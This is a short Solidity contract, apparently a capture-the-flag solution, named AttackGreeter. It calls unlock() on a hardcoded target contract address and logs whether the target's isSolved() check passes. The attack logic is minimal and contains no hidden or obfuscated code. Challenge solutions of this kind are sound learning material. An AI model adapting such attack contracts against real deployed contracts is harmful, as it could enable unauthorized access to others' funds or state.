// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Define the interface of the target contract
interface ITargetContract {
    //function resolve(bytes memory _data) external;
    function unlock() external;
    function isSolved() external returns (bool);
}
contract AttackGreeter {
    ITargetContract targetContract;
    event Log(address sender, string message);
    constructor() {
        address _targetContractAddress = 0x54e51c138F020c6A203cB4cE26Ad4ff5DA7aEA8D;
        targetContract = ITargetContract(_targetContractAddress);
    }

    function unlock() public {
            targetContract.unlock();
    }

    function isSolved() public {
        if (targetContract.isSolved()) {
            emit Log(msg.sender, "[+] Success." );
        } else {
            emit Log(msg.sender, "[-] Failure.");
        }
        
    }
}